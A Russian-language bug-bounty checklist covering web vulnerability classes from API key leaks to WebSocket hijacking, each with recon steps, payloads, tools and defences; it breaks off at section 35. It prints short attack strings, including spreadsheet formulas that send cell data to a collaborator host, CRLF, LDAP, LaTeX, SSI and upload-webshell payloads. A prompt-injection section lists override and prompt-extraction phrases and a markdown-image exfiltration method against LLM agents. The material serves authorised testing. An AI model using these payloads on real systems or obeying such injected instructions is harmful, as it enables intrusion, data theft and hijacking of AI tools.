# Чек-листы по уязвимостям — часть 2 (operational, 2025-2026)

> Продолжение `checklists.md`. Оставшиеся 39 категорий из 64 (PayloadsAllTheThings). Формат тот же: пункт = действие, идёшь сверху вниз, отмечаешь `[x]`.
> Развёрнутое исследование (impact, CVE, источники) — в `research-part2.md`.

**Содержание:** [API Key Leaks](#1-api-key-leaks) · [Brute Force & Rate Limit](#2-brute-force--rate-limit) · [Clickjacking](#3-clickjacking) · [CSPT](#4-client-side-path-traversal-cspt) · [CRLF](#5-crlf-injection) · [CSS Injection](#6-css-injection) · [CSV Injection](#7-csv-injection-formula-injection) · [CVE Exploits](#8-cve-exploits) · [DNS Rebinding](#9-dns-rebinding) · [DOM Clobbering](#10-dom-clobbering) · [DoS](#11-denial-of-service) · [Dependency Confusion](#12-dependency-confusion) · [Encoding Transformations](#13-encoding-transformations) · [External Variable Modification](#14-external-variable-modification) · [GWT](#15-google-web-toolkit-gwt) · [HPP](#16-http-parameter-pollution-hpp) · [Headless Browser](#17-headless-browser) · [Hidden Parameters](#18-hidden-parameters) · [Insecure Management Interface](#19-insecure-management-interface) · [Insecure Randomness](#20-insecure-randomness) · [SCM Leaks (.git/.svn)](#21-insecure-source-code-management-gitsvn-leaks) · [Java RMI](#22-java-rmi) · [LDAP Injection](#23-ldap-injection) · [LaTeX Injection](#24-latex-injection) · [ORM Leak](#25-orm-leak) · [Prompt Injection (LLM)](#26-prompt-injection-llm) · [ReDoS](#27-regular-expression-redos) · [Reverse Proxy Misconfig](#28-reverse-proxy-misconfigurations) · [SAML Injection](#29-saml-injection) · [SSI/ESI](#30-ssi--esi-injection) · [Tabnabbing](#31-tabnabbing-reverse-tabnabbing) · [Type Juggling](#32-type-juggling) · [Upload Insecure Files](#33-upload-insecure-files) · [Virtual Hosts](#34-virtual-hosts-vhost-enumeration) · [WebSockets (CSWSH)](#35-web-sockets-cswsh) · [XPATH](#36-xpath-injection) · [XS-Leaks](#37-xs-leaks) · [XSLT](#38-xslt-injection) · [Zip Slip](#39-zip-slip)

---

## 1. API Key Leaks

**Recon / где искать**
- [ ] JS-бандлы (`grep` по `api_key`, `apikey`, `token`, `secret`, `AKIA`, `AIza`, `sk_live`, `xoxb`)
- [ ] Исходники фронта, sourcemaps (`.js.map`)
- [ ] Git-история (`.git` экспонирован, GitHub/GitLab публичные репо, dorks `org:target filename:.env`)
- [ ] Мобильные APK/IPA (декомпиляция → strings)
- [ ] Wayback Machine, public S3-бакеты, Postman/Swagger коллекции
- [ ] HTTP-ответы, заголовки, error-страницы

**Детект / валидация (обязательно перед репортом)**
- [ ] Определить тип ключа по префиксу/формату (`keyhacks`, `secretmagpie`)
- [ ] Проверить, валиден ли ключ и его scope (минимальный безопасный запрос, без злоупотребления)
- [ ] Оценить impact: что ключ даёт (биллинг, PII, отправка почты/SMS, админ)

**Инструменты:** `trufflehog`, `gitleaks`, `keyhacks`, `gitdorks`, `nuclei` (exposure templates)
**Защита (для репорта):** secret scanning в CI; ротация при утечке; secret vault (не в коде/фронте); scoped/short-lived ключи

---

## 2. Brute Force & Rate Limit

**Recon / где искать**
- [ ] Точки: login, OTP/2FA, password reset, промокоды, инвайты, PIN, API-ключи
- [ ] Понять модель лимита: per-IP, per-account, per-session, глобальный, либо отсутствует

**Детект / обход**
- [ ] Лимит вообще есть? Прогнать 50+ попыток
- [ ] IP-rotation: заголовки `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP` (менять каждый запрос)
- [ ] Сброс счётчика: смена регистра логина, добавление точки/`%00`, разные форматы (`user`, `User`, `user `)
- [ ] Числовой OTP/PIN: single-packet race (см. §15 ч.1) для обхода лимита попыток
- [ ] Reset-токен короткий/числовой → перебор
- [ ] Distributed brute force (если лимит per-IP)

**Инструменты:** Burp Intruder, `ffuf`, Turbo Intruder (race), `hydra`
**Защита (для репорта):** lockout/exponential backoff per account+IP; CAPTCHA после N попыток; длинные случайные токены; уведомления

---

## 3. Clickjacking

**Детект**
- [ ] Проверить отсутствие `X-Frame-Options` и `Content-Security-Policy: frame-ancestors`
- [ ] Попробовать встроить страницу в `<iframe>` на своём домене → рендерится?

**Эксплуатация**
- [ ] Найти чувствительное действие в один клик (смена настроек, удаление, подтверждение, OAuth-consent)
- [ ] Построить PoC: прозрачный iframe (`opacity:0`) поверх приманки
- [ ] Multi-step / drag-and-drop варианты при необходимости

**Инструменты:** Burp Clickbandit, ручной HTML
**Защита (для репорта):** `frame-ancestors 'none'` или `'self'`; `X-Frame-Options: DENY`; `SameSite` cookies
> Обычно low severity — нужен sensitive one-click action для impact.

---

## 4. Client Side Path Traversal (CSPT)

**Recon / где искать**
- [ ] Найти client-side `fetch`/`axios`/XHR, где часть пути берётся из URL-параметра, hash или stored-значения (`id`, `slug`, `note`)
- [ ] Загрузить CSPT Burp extension (Doyensec) → Source Scope = client-параметры, Sink Methods = GET/POST/PUT/DELETE

**Детект / эксплуатация**
- [ ] Внедрить `../` в значение → нормализуется и редиректит fetch на другой эндпоинт?
- [ ] Варианты dot-segment: `../`, `..%2f`, `..;/`, `.././`, UTF-8 омоглифы
- [ ] Суффиксы под валидность сегмента: `.json`, `.css`, `;` (matrix params)
- [ ] **CSPT2CSRF**: увести authenticated POST/PUT/DELETE на чувствительный эндпоинт (password reset, payment approval, удаление MFA админа) — обходит CSRF-токены (фронт сам их добавляет)
- [ ] **CSPT2XSS**: увести на эндпоинт, ответ которого попадает в DOM-сток
- [ ] Header-based auth (JWT в `Authorization`): фронт сам подставит токен → классический CSRF «оживает»
- [ ] Gadget-файл через upload (JSON, валидный для `JSON.parse`) если источник — загруженный файл

**Инструменты:** Doyensec **CSPTBurpExtension**, **Gecko** (Vitor Falcao), **CSPTPlayground**
**Защита (для репорта):** не строить пути из пользовательского ввода; валидировать/нормализовать перед fetch; allowlist эндпоинтов

---

## 5. CRLF Injection

**Recon / где искать**
- [ ] Параметры, попадающие в HTTP-заголовки ответа: redirect (`Location`), `Set-Cookie`, кастомные заголовки, лог

**Детект / эксплуатация**
- [ ] Внедрить `%0d%0a` → появляется новый заголовок в ответе?
- [ ] Header injection: `%0d%0aSet-Cookie:%20sessid=attacker`
- [ ] HTTP response splitting → XSS: `%0d%0a%0d%0a<script>alert(1)</script>`
- [ ] Open redirect / cache poisoning через инжект `Location`
- [ ] Log injection (подделка записей)

**Обход фильтров**
- [ ] Варианты: `%0d%0a`, `%0a`, `%0d`, `\r\n`, `%23%0d%0a`
- [ ] Unicode/overlong: `%E5%98%8A%E5%98%8D` (→ CR LF)
- [ ] nginx и ряд бэкендов принимают декодированные `\r\n` в некоторых sink'ах

**Инструменты:** Burp, `crlfuzz`, `nuclei`
**Защита (для репорта):** удалять CR/LF из ввода, не отражать пользовательский ввод в заголовки

---

## 6. CSS Injection

**Recon / где искать**
- [ ] Точки, где ввод попадает в `<style>` или атрибут `style` (темизация, кастомные стили, email)

**Детект / эксплуатация**
- [ ] Подтвердить инъекцию CSS-правила
- [ ] Эксфильтрация по селекторам атрибутов: `input[value^="a"]{background:url(//collab/a)}` → посимвольно
- [ ] Кража CSRF-токена/secret из value/атрибутов
- [ ] Blind: `@import`, font ligatures, рекурсивный `@import` для последовательного слива
- [ ] Возможный chain → account takeover (через утечку токена)

**Инструменты:** ручной, Burp Collaborator
**Защита (для репорта):** CSP; санитизация/экранирование ввода в стили; не помещать секреты в DOM-атрибуты

---

## 7. CSV Injection (Formula Injection)

**Recon / где искать**
- [ ] Поля, попадающие в экспортируемый CSV/XLSX (имя, комментарий, профиль, любой пользовательский текст)

**Детект / эксплуатация**
- [ ] Внедрить значение, начинающееся с `=`, `+`, `-`, `@`, Tab(`0x09`), CR(`0x0D`)
- [ ] DDE RCE (Excel, при подтверждении пользователем): `=cmd|'/c calc'!A1`
- [ ] Эксфильтрация: `=HYPERLINK("//collab/?"&A1,"click")`, `=WEBSERVICE("//collab/?"&A1)`
- [ ] Скачать экспорт, открыть в Excel/Sheets → проверить срабатывание

**Инструменты:** ручной
**Защита (для репорта):** префиксовать опасные начальные символы апострофом `'`; экранировать формульные символы при генерации файла

---

## 8. CVE Exploits

**Методология (meta-категория)**
- [ ] Зафингерпринтить продукт и **точную версию** (заголовки, favicon-hash, статичные файлы, `/CHANGELOG`, JS-версии)
- [ ] Поиск CVE: NVD, GitHub Security Advisories, Exploit-DB, `searchsploit`, CISA KEV
- [ ] Найти PoC (GitHub, packetstorm) → прочитать, понять, **проверить применимость к версии**
- [ ] Прогнать `nuclei` с релевантными templates по версии/продукту
- [ ] Аккуратно подтвердить (без деструктива), оценить impact

**Инструменты:** `nuclei`, `searchsploit`, Metasploit, NVD/GHSA, Shodan
**Защита (для репорта):** патч-менеджмент, мониторинг KEV, virtual patching/WAF как временная мера

---

## 9. DNS Rebinding

**Recon / где искать**
- [ ] Сервисы, валидирующие хост/IP **до** запроса, но резолвящие отдельно (SSRF-фильтры, importers)
- [ ] Внутренние сервисы и IoT без проверки `Host`-заголовка

**Детект / эксплуатация**
- [ ] Настроить домен с TTL=0, чередующий публичный IP → `127.0.0.1`/internal
- [ ] Пройти валидацию на публичном IP, затем ребиндить на внутренний (TOCTOU)
- [ ] Цель: внутренние API, cloud metadata, локальные сервисы

**Инструменты:** **Singularity of Origin** (NCC), `rebind`, `whonow`
**Защита (для репорта):** валидация `Host`; DNS pinning; резолв и запрос — одним шагом; egress-фильтрация

---

## 10. DOM Clobbering

**Recon / где искать**
- [ ] HTML-инъекция без `<script>` (санитайзер режет скрипты, но пропускает `id`/`name`)
- [ ] JS, читающий `window.X`/`document.X`/глобалы без объявления

**Детект / эксплуатация**
- [ ] Перезаписать глобал: `<a id=x href="javascript:...">`, `<a id=x name=y>`
- [ ] Вложенные: `<form id=x><input name=y></form>` → `x.y`
- [ ] Коллекции через дублирующиеся `id`
- [ ] Chain → XSS или CSP-bypass (перезапись `script.src`/конфига; см. CVE-2025-1647 Bootstrap)

**Инструменты:** Burp **DOM Invader** (clobbering-режим)
**Защита (для репорта):** явное объявление переменных; namespacing; `Object.freeze`; санитайзер, режущий `id`/`name`; Trusted Types

---

## 11. Denial of Service

> Только в авторизованном scope. Многие программы DoS запрещают — часто тестируют «вероятность» без реального обрушения.

**Recon / где искать**
- [ ] Точки с неограниченной обработкой: загрузка файлов, парсинг JSON/XML, regex по вводу, поиск, генерация отчётов/изображений, GraphQL

**Детект (без полного обрушения)**
- [ ] Алгоритмическая сложность: ReDoS-паттерн (см. §27), hash-collision
- [ ] Декомпрессия: zip/gzip bomb, XML billion laughs (entity expansion)
- [ ] Глубоко вложенный JSON/XML; GraphQL depth/alias (см. §19 ч.1)
- [ ] Большие payloads без лимита размера; масштабирование времени ответа с ростом ввода (на graduated-нагрузке, не до отказа)

**Инструменты:** ручной, `regexploit`
**Защита (для репорта):** лимиты размера/глубины/таймаутов; ограничение сложности; RE2; rate limiting; декомпрессия с лимитом

---

## 12. Dependency Confusion

**Recon / где искать**
- [ ] Извлечь имена внутренних пакетов: `package.json`, `requirements.txt`, lock-файлы, error-стектрейсы, JS-бандлы, scope-имена (`@company/...`)
- [ ] Проверить, какие из них **не зарегистрированы** в публичном npm/PyPI/registry

**Детект / эксплуатация (этично, в scope)**
- [ ] Незарегистрированное имя + публичный реестр + дефолтная резолюция → возможна подмена
- [ ] Проверять через канареечный пакет с **более высокой** версией и безопасным beacon (только OAST/DNS, без вредоносной нагрузки) — строго в рамках программы
- [ ] Учесть install-time (postinstall/setup.py) vs runtime триггеры

**Инструменты:** `confused`, `snync`, Socket.dev, OWASP DependencyTrack
**Защита (для репорта):** namespace ownership (застолбить имена публично как stub); единый приватный индекс/scoped registry; пин версий; cooldown новых пакетов
> Контекст 2025: Shai-Hulud 2.0, GhostAction (3325 секретов), компрометация chalk/debug — supply chain под прицелом.

---

## 13. Encoding Transformations

> Не уязвимость, а универсальный байпас-тулкит для всех остальных классов.

**Применение**
- [ ] URL / double-URL encoding (`%2e`, `%252e`)
- [ ] Unicode-нормализация NFKC (символ → ASCII после нормализации на бэке)
- [ ] Overlong UTF-8, fullwidth-символы (`／`, `＜`)
- [ ] HTML-entities (`&lt;`, `&#x3c;`, `&#60;`)
- [ ] Base64 / hex / mixed-case
- [ ] Комбинировать слои под конкретный парсер (фронт декодирует иначе, чем бэк)

**Инструменты:** **Hackvertor** (Burp), CyberChef, `ffuf` с энкодерами
**Защита (для репорта):** канонизация до валидации; единое поведение декодирования во всей цепочке

---

## 14. External Variable Modification

**Recon / где искать**
- [ ] PHP-приложения с `extract($_REQUEST/$_GET/$_POST)`, `import_request_variables`, `$$var`, register_globals-стиль

**Детект / эксплуатация**
- [ ] Подставить параметр с именем внутренней переменной (`?authenticated=1`, `?isAdmin=1`, `?user_id=...`)
- [ ] Перезаписать переменную до проверки → auth bypass / logic flaw
- [ ] Перезапись include-путей/конфигов

**Инструменты:** ручной, анализ исходников
**Защита (для репорта):** не применять `extract()`/динамические переменные к пользовательскому вводу; явное присваивание

---

## 15. Google Web Toolkit (GWT)

**Recon / где искать**
- [ ] Признаки GWT: `*.nocache.js`, `*.cache.html`, эндпоинты GWT-RPC, `X-GWT-Permutation`
- [ ] Найти RPC-сервисы и serialization policy (`.gwt.rpc`)

**Детект / эксплуатация**
- [ ] Распарсить GWT-RPC payload, перечислить методы/сервисы
- [ ] Найти скрытые/недокументированные методы и параметры
- [ ] Подменять типы/значения в RPC-запросе (логика, IDOR, инъекции в нижележащие вызовы)

**Инструменты:** **GWTMap**, GWT-Penetration-Testing helpers, Burp
**Защита (для репорта):** серверная авторизация на каждый RPC-метод; валидация; не полагаться на «скрытость» методов

---

## 16. HTTP Parameter Pollution (HPP)

**Recon / где искать**
- [ ] Любые параметры (GET/POST), особенно проходящие через прокси/WAF к бэкенду

**Детект / эксплуатация**
- [ ] Дублировать параметр: `?id=1&id=2` → какой берётся (первый/последний/массив/конкатенация)?
- [ ] WAF-bypass: вредоносное значение во втором вхождении, если WAF проверяет первое
- [ ] Логика/auth-bypass за счёт расхождения парсинга фронт↔бэк
- [ ] Client-side HPP: инъекция `&`/`%26` в значение, попадающее в генерируемый URL/ссылку

**Инструменты:** Burp, `nuclei`
**Защита (для репорта):** единообразный парсинг параметров; явная валидация; reject дубликатов где уместно

---

## 17. Headless Browser

> Атака на server-side рендеринг (PDF/скриншот/preview через puppeteer/Chromium).

**Recon / где искать**
- [ ] Функции: HTML→PDF, генерация скриншота, превью ссылок/URL, рендер шаблонов

**Детект / эксплуатация**
- [ ] Внедрить HTML/JS в рендеримый контент → XSS в контексте рендерера
- [ ] Local file read: `<iframe src="file:///etc/passwd">`, `<script>fetch('file:///...')`
- [ ] SSRF: `<img src="http://169.254.169.254/...">`, `<iframe src="http://internal/">`
- [ ] Утечка через рендер в итоговый PDF/скриншот

**Инструменты:** ручной, Burp Collaborator, см. §3/§4 ч.1 (SSRF/SSTI)
**Защита (для репорта):** `--no-sandbox` НЕ использовать; изоляция рендерера; блок `file://`/internal; таймауты; запрет внешних ресурсов

---

## 18. Hidden Parameters

**Recon / где искать**
- [ ] JS-бандлы (имена параметров), Swagger/OpenAPI, GraphQL introspection, error-сообщения
- [ ] Wordlists скрытых параметров

**Детект / эксплуатация**
- [ ] Брутфорс параметров: `Arjun`, `param-miner`, `x8`
- [ ] Проверить эффект: `debug=true`, `admin=1`, `test=1`, `source=true`, `is_admin`
- [ ] Chain → Mass Assignment (§22 ч.1), privilege escalation, debug-раскрытие, ORM Leak (§25)

**Инструменты:** `Arjun`, Burp **Param Miner**, `x8`
**Защита (для репорта):** allowlist принимаемых параметров; отключить debug в проде; серверная авторизация

---

## 19. Insecure Management Interface

**Recon / где искать**
- [ ] Фаззинг путей: `/admin`, `/manager/html`, `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/jolokia`, `/console`, `/phpmyadmin`, `/.well-known/`, Kibana/Grafana/Jenkins
- [ ] Shodan/Censys по продукту и порту; нестандартные порты

**Детект / эксплуатация**
- [ ] Доступ без авторизации?
- [ ] Default creds (`admin:admin`, vendor-defaults)
- [ ] Spring Boot Actuator: `/env`, `/heapdump` (секреты), `/mappings`, `/gateway` → RCE-цепочки
- [ ] Tomcat Manager / Jolokia (MBean) → деплой/RCE

**Инструменты:** `nuclei`, `ffuf`, `feroxbuster`, Shodan
**Защита (для репорта):** ограничение по IP/VPN/auth; отключить чувствительные actuator-эндпоинты; сменить дефолты

---

## 20. Insecure Randomness

**Recon / где искать**
- [ ] Токены: session, password reset, OTP, CSRF, API-ключи, invite-коды

**Детект / эксплуатация**
- [ ] Собрать множество токенов → анализ на последовательность/низкую энтропию
- [ ] Признаки слабого PRNG: time-seeded, `Math.random()`, `mt_rand()`, инкремент, предсказуемость
- [ ] Если предсказуемо → предсказать reset/session-токен жертвы

**Инструменты:** анализ энтропии (`burp sequencer`), ручной
**Защита (для репорта):** CSPRNG (`secrets`, `crypto.randomBytes`, `SecureRandom`); достаточная длина; не на основе времени

---

## 21. Insecure Source Code Management (.git/.svn leaks)

**Recon / где искать**
- [ ] Проверить: `/.git/HEAD`, `/.git/config`, `/.svn/entries`, `/.hg/`, `/.bzr/`, `/.DS_Store`, `/.gitignore`

**Детект / эксплуатация**
- [ ] `/.git/HEAD` отдаёт `ref: refs/heads/...` → репозиторий доступен
- [ ] Дамп: `git-dumper`, `GitTools` (Dumper/Extractor), `dvcs-ripper`
- [ ] Извлечь исходники, секреты, историю коммитов (удалённые ключи)
- [ ] `.DS_Store` → `ds_store_exp` для листинга директорий

**Инструменты:** `git-dumper`, `GitTools`, `dvcs-ripper`, `nuclei` (exposures), `ds_store_exp`
**Защита (для репорта):** блокировать доступ к dot-файлам/директориям на веб-сервере; не деплоить VCS-каталоги; CI без `.git` в артефакте

---

## 22. Java RMI

**Recon / где искать**
- [ ] Порты RMI registry (1099 и др.), JMX (обычно 1099/9010/случайные)
- [ ] Идентифицировать сервис (`nmap -sV`, `--script rmi-dumpregistry`)

**Детект / эксплуатация**
- [ ] Перечислить bound objects в registry
- [ ] Deserialization через RMI (передача gadget-объекта)
- [ ] JMX: MLet → загрузить удалённый MBean → RCE; default/no-auth JMX
- [ ] Remote method guessing/abuse

**Инструменты:** **remote-method-guesser (rmg)**, **BaRMIe**, `ysoserial`, `nmap` rmi-scripts
**Защита (для репорта):** не экспонировать RMI/JMX наружу; JMX auth+TLS; deserialization-фильтры; обновления

---

## 23. LDAP Injection

**Recon / где искать**
- [ ] Точки, ходящие в LDAP: login, поиск пользователей/групп, address book

**Детект / эксплуатация**
- [ ] Спецсимволы `(`, `)`, `*`, `\`, `|`, `&` → ошибка/изменение
- [ ] Auth bypass: `*)(uid=*))(|(uid=*`, `admin)(&)`, `*)(|(password=*))`
- [ ] Wildcard-перечисление: `*`
- [ ] Blind boolean: посимвольно через `(attr=a*)` и наблюдение результата

**Инструменты:** ручной, `ldapsearch`, скрипты
**Защита (для репорта):** экранирование LDAP-метасимволов; параметризация фильтров; валидация ввода

---

## 24. LaTeX Injection

**Recon / где искать**
- [ ] Точки компиляции LaTeX (генераторы PDF, научные/отчётные сервисы, math-рендер)

**Детект / эксплуатация**
- [ ] File read: `\input{/etc/passwd}`, `\include{...}`, `\lstinputlisting{/etc/passwd}`, `\verbatiminput{...}`
- [ ] RCE (если включён shell-escape): `\immediate\write18{id}`, `\write18{cat /etc/passwd}`
- [ ] Запись файлов: `\newwrite\out \openout\out=...`
- [ ] Проверить доступ к итоговому PDF (вывод чтения)

**Инструменты:** ручной
**Защита (для репорта):** отключить `--shell-escape`; sandbox-компиляция (контейнер/restricted); allowlist команд; таймаут

---

## 25. ORM Leak

**Recon / где искать**
- [ ] Эндпоинты поиска/фильтрации, принимающие имена полей/операторы из запроса
- [ ] Паттерны: Django `filter(**request.data)`, `Q(**params)`; Prisma `where: req.query.filter`; Beego; Ransack (Ruby)

**Детект / эксплуатация**
- [ ] Django field lookups: `?password__startswith=a`, `?email__contains=admin`, `?token__regex=^abc`
- [ ] JSONField: `?profile__secret_key__startswith=sk_`, `?settings__has_key=api_key`
- [ ] Boolean-oracle посимвольно (есть/нет результата) → автоматизировать бинарный поиск
- [ ] Relational filtering: пивот через one-to-one / many-to-many к чувствительным полям связанных таблиц
- [ ] Error-based через ReDoS-предикат на MySQL (когда длина ответа не оракул)
- [ ] Учесть collation БД при подборе порядка символов
- [ ] **CVE-2025-64459 (Django)**: `_connector`/`_negated` в `Q(**params)` → полноценная SQLi (CVSS 9.1)

**Инструменты:** **plormber** (time-based ORM Leak), elttam **semgrep-rules** (Django/Prisma/Beego/EF), ручной Python-скрипт
**Защита (для репорта):** allowlist queryable-полей (никогда не давать фильтровать по password/token); server-controlled query logic; не разворачивать пользовательский dict в ORM-вызов

---

## 26. Prompt Injection (LLM)

**Recon / где искать**
- [ ] AI-фичи в scope: чат-боты, RAG, агенты с tool-calls, суммаризаторы, обработка документов/писем/сайтов
- [ ] Точки внешнего контента, который читает модель (indirect): web-страницы, файлы, email, имена/описания

**Детект / эксплуатация**
- [ ] Direct: instruction override («ignore previous instructions», смена роли)
- [ ] System prompt extraction («repeat your instructions verbatim»)
- [ ] **Indirect**: спрятать инструкции во внешнем контенте (страница/PDF/резюме), который попадёт в контекст через RAG/tool-call — white/мелкий шрифт, HTML-комментарии
- [ ] Tool/function abuse: заставить агента вызвать опасный инструмент (отправка данных, действия)
- [ ] Data exfiltration через markdown-image/ссылку на свой домен с данными в URL
- [ ] Обход guardrail: base64/emoji/multilingual-энкодинг инструкций, character injection (LLMSEC 2025)

**Инструменты:** Arcanum Prompt Injection Taxonomy, garak, PromptFoo, ручной
**Защита (для репорта):** разделение данных/инструкций (spotlighting); least-privilege для tool-calls + human-in-the-loop; фильтрация выходного канала (no auto-fetch); санитизация внешнего контента; defense-in-depth (OWASP LLM01:2025, NIST AI RMF)

---

## 27. Regular Expression (ReDoS)

**Recon / где искать**
- [ ] Поля, матчащиеся серверной regex: валидация email/URL/телефона, поиск, парсинг; пользовательские regex

**Детект / эксплуатация**
- [ ] Найти уязвимый паттерн: nested quantifiers `(a+)+`, `(.*)*`, перекрытие альтернатив `(a|a)*`, `(a|ab)*`
- [ ] Payload: длинная строка near-match + ломающий символ в конце (`"aaaa...aaaa!"`)
- [ ] Измерить рост времени ответа (catastrophic backtracking)

**Инструменты:** **regexploit**, `recheck`, `redos-detector`
**Защита (для репорта):** RE2 (линейная сложность); атомарные группы/possessive; таймаут на матч; лимит длины ввода; избегать nested quantifiers

---

## 28. Reverse Proxy Misconfigurations

**Recon / где искать**
- [ ] Определить связку (CDN/прокси + origin): nginx, Apache, HAProxy, Envoy + backend
- [ ] Найти эндпоинты, защищённые на уровне прокси (auth/ACL), но проксируемые на бэк

**Детект / эксплуатация**
- [ ] **nginx alias traversal** (нет завершающего слеша в `location`): `/assets../`, `/images../config.php` → `ffuf -u http://t/assets../FUZZ`
- [ ] location-matching: `location /admin` (без `/`) обходится `/admin/` или наоборот; добавление байта (`\x85`, `%85`) ломает `location = /admin`
- [ ] **Path confusion** фронт↔бэк (PAN-OS CVE-2025-0108): расхождение нормализации → auth bypass (`X-pan-AuthCheck`), internal redirect → выполнение скрытого скрипта
- [ ] Header smuggling: подстановка/перезапись `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host` если прокси их не очищает
- [ ] CRLF в небезопасных nginx-переменных (`$uri`/`$arg_`)
- [ ] `merge_slashes off` нюансы; `proxy_pass` без слеша → traversal к бэку (`/api../`)

**Инструменты:** **bypass-url-parser** (laluka), **Kyubi** (alias traversal), `ffuf`, см. §19 ч.1 (smuggling)
**Защита (для репорта):** trailing slash в `location`/`alias`; единая нормализация фронт↔бэк; очистка hop-by-hop и `X-*` заголовков; whitelisting IP для management

---

## 29. SAML Injection

**Recon / где искать**
- [ ] SAML SSO-флоу (SP-/IdP-initiated); перехватить `SAMLResponse` (Base64, часто URL-encoded/deflate)
- [ ] Идентифицировать библиотеку SP (ruby-saml, php-saml, samlify, python3-saml, xmlseclibs)

**Детект / эксплуатация**
- [ ] **XML Signature Wrapping (XSW)**: добавить вредоносный unsigned-assertion рядом с подписанным; перебрать позиции (SAML Raider — 8 техник XSW)
- [ ] **Parser differential** (ruby-saml ReXML vs Nokogiri): payload, который check видит иначе, чем app-логика (CVE-2025-25291/25292/66567/66568; samlify CVE-2025-47949)
- [ ] **Comment injection** в NameID: `admin<!---->@evil.com` → текст после комментария теряется при канонизации (старый, но проверить)
- [ ] **Golden SAML / empty-string signature reuse** (PortSwigger «Fragile Lock», libxml2 canonicalization): подпись пустой строки → валид на произвольный Response
- [ ] `alg`/certificate confusion; отсутствие проверки `Recipient`/`Audience`/`NotOnOrAfter`; XXE в SAML (см. §9 ч.1)
- [ ] Подменить NameID/атрибуты на `admin`

**Инструменты:** Burp **SAML Raider**, `samling`, ручной XML
**Защита (для репорта):** один XML-парсер; schema hardening + `disallow-doctype`; подпись всего assertion и проверка ссылок; проверка Audience/Recipient/время; обновить библиотеку (ruby-saml ≥1.18.0)

---

## 30. SSI / ESI Injection

**Recon / где искать**
- [ ] SSI: `.shtml`/`.stm`, Apache `mod_include`, точки отражения в HTML
- [ ] ESI: наличие edge-кэша/CDN (Varnish, Akamai, Fastly, Squid); заголовок `Surrogate-Control`

**Детект / эксплуатация**
- [ ] SSI: `<!--#echo var="DATE_LOCAL"-->`, `<!--#include virtual="/etc/passwd"-->`, `<!--#exec cmd="id"-->`
- [ ] ESI: `<esi:include src="http://collab/"/>` (SSRF), `<esi:include src="..."/>` для XSS/инклюда, `<esi:debug/>`
- [ ] ESI → обход HttpOnly/XSS если движок исполняет внедрённый ESI из пользовательского ввода

**Инструменты:** ручной, Burp Collaborator
**Защита (для репорта):** не обрабатывать SSI/ESI из пользовательского ввода; отключить `exec`; экранирование; ограничить `esi:include` доверенными источниками

---

## 31. Tabnabbing (Reverse Tabnabbing)

**Recon / где искать**
- [ ] Внешние ссылки/окна с `target="_blank"` **без** `rel="noopener noreferrer"`
- [ ] Точки, где пользователь задаёт URL, открываемый в новой вкладке (отзывы, профили, чаты)

**Детект / эксплуатация**
- [ ] Открытая страница получает `window.opener` → может переписать `window.opener.location` на фишинг
- [ ] PoC: контролируемая страница, делающая `window.opener.location = 'https://phish/'`

**Инструменты:** ручной HTML
**Защита (для репорта):** `rel="noopener noreferrer"` на всех `_blank`; современные браузеры по умолчанию `noopener`, но не полагаться на это для старых
> Обычно low severity (фишинг-вектор).

---

## 32. Type Juggling

**Recon / где искать**
- [ ] Точки сравнения, принимающие типизированный ввод (JSON-API): login, токен-проверка, сравнение хешей
- [ ] PHP с `==` вместо `===`, `strcmp`, `in_array` без strict

**Детект / эксплуатация**
- [ ] Magic hashes: значения с хешем вида `0e\d+` → `"0e123" == "0e456"` истинно (оба «0»)
- [ ] JSON typed bypass: `{"password": true}`, `{"password": 0}`, `{"hmac": 0}` против строкового сравнения
- [ ] `strcmp(array, "str")` → NULL → `NULL == 0` истинно (auth bypass)
- [ ] `in_array($x, $arr)` без strict
- [ ] Учесть PHP 8: `0 == "abc"` теперь **false** (раньше true) — `0=="string"`-байпасы не работают, но magic-hash (`0e`) и array-tricks остаются

**Инструменты:** magic-hash списки, ручной
**Защита (для репорта):** строгое сравнение `===`/`hash_equals()`; проверка типов до сравнения; не сравнивать секреты через `==`

---

## 33. Upload Insecure Files

**Recon / где искать**
- [ ] Найти upload-эндпоинты (аватар, документ, импорт); понять, где файлы сохраняются и доступны ли по URL

**Детект / обход (комбинировать)**
- [ ] Прямая загрузка shell по бэкенду: `.php`/`.phtml`/`.php5`/`.pht`/`.phar` (PHP), `.jsp`/`.jspx`, `.asp`/`.aspx`
- [ ] Double extension: `shell.php.jpg`, `shell.jpg.php`
- [ ] Content-Type spoof: `Content-Type: image/png` на PHP-файле
- [ ] Magic bytes: префикс `GIF89a;` / валидный заголовок изображения + код
- [ ] Null byte (старые): `shell.php%00.jpg`
- [ ] Регистр/спецсимволы: `.pHp`, `shell.php.`, `shell.php;.jpg`, trailing space/dots
- [ ] **.htaccess override** (Apache): загрузить `.htaccess` с `AddType application/x-httpd-php .jpg`
- [ ] Полиглот / **PHP в IDAT-чанке PNG** (переживает resize через `imagecopyresized`)
- [ ] ImageMagick (если обработка): `push graphic-context ... fill 'url(...|cmd)'` (CVE-семейство ImageTragick)
- [ ] Path traversal в имени файла → запись вне директории (см. Zip Slip §39)
- [ ] Проверить выполнение: `uploads/shell.php?cmd=id`

**Инструменты:** Burp, `nuclei` (upload-bypass templates), exiftool (внедрение в метаданные)
**Защита (для репорта):** allowlist расширений + magic-bytes + ре-кодирование; рандомные имена; хранить вне webroot; отключить выполнение скриптов в upload-дире; CDN с forced download

---

## 34. Virtual Hosts (vhost enumeration)

**Recon / где искать**
- [ ] Получить IP цели; понять, что на нём может хоститься несколько vhost
- [ ] Источники имён: subdomain-wordlists, найденные субдомены, корп-нейминг (`dev`, `staging`, `internal`, `admin`, `jira`)

**Детект / эксплуатация**
- [ ] Фаззинг `Host`-заголовка на одном IP: `ffuf -u http://IP/ -H "Host: FUZZ.target.com" -fs <baseline>`
- [ ] `gobuster vhost`, `VHostScan` — фильтровать по размеру/коду/заголовкам ответа
- [ ] Найти internal/staging/admin vhosts, отсутствующие в публичном DNS → доступ к скрытым приложениям

**Инструменты:** `ffuf`, `gobuster vhost`, `VHostScan`
**Защита (для репорта):** default-vhost возвращает 404/403; не хостить internal на публичном IP без сетевого ограничения

---

## 35. Web Sockets (CSWSH)

**Recon / где искать**
- [ ] Найти WebSocket-соединения (`ws://`/`wss://`, апгрейд-запрос в Burp); понять, что передаётся
- [ ] Проверить handshake: есть ли CSRF-токен, проверяется ли `Origin`

**Детект / эксплуатация**
